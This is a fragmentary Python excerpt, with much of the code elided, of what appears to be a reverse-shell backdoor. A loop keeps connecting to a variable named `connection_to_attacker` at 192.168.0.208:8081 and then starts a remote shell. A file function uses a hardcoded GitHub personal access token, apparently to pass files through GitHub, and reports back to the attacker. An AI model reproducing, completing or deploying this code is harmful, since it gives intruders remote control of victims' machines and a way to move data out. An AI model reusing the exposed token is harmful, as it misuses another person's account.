...
def download_file(file_name):
    ...
    g = Github("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")
    ...
    reliable_send(git_file + ' CREATED')
...
def connection():
    while True:
        time.sleep(5)
        try:
            connection_to_attacker.connect(("192.168.0.208", 8081))
            shell()
